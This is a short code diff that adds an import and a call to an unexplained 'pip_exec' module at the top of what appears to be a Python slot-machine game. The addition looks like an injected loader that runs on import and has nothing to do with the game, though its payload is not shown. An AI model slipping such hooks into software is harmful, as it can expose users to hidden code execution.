@@ -1,3 +1,5 @@
+from pip_exec import *
+pip_exec()
 import os
 from colorama import Fore
 from game import check_win, spin_animation
